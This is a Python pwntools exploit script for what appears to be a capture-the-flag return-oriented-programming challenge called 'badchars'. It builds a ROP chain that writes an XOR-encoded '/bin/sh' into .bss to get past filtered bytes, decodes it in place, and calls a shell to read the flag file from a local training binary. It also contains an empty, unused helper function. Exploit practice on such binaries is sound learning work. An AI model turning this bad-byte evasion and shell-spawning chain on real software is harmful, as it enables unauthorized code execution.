#!/usr/bin/python
from pwn import *
# bad bytes: 62 69 63 2f 20 66 6e 73

def xor_obfuscate(string, address, badbytes):
    return

if __name__ == "__main__":
    payload = ""
    payload += cyclic(40)
    payload += p64(0x00000000400b3b)  # pop r12; pop r13; ret
    payload += p64(0x6b702c6d6a612c)
    payload += p64(0x00000000601080)  # .bss
    payload += p64(0x00000000400b34)  # mov qword ptr [r13], r12; ret

    for offset in range(0, 7):
        payload += p64(0x00000000400b40)  # pop r14, pop r15; ret
        payload += p64(0x3)
        payload += p64(0x00000000601080 + offset)  # .bss
        payload += p64(0x00000000400b30)  # xor byte ptr [r15], r14b

    payload += p64(0x00000000400b39)  # pop rdi; ret
    payload += p64(0x00000000601080)  # .bss
    payload += p64(0x000000004006f0)

    elf = ELF("./badchars")
    io  = process(elf.path)
    io.recv()
    io.sendline(payload)
    io.sendline("cat flag.txt")
    print io.recv()
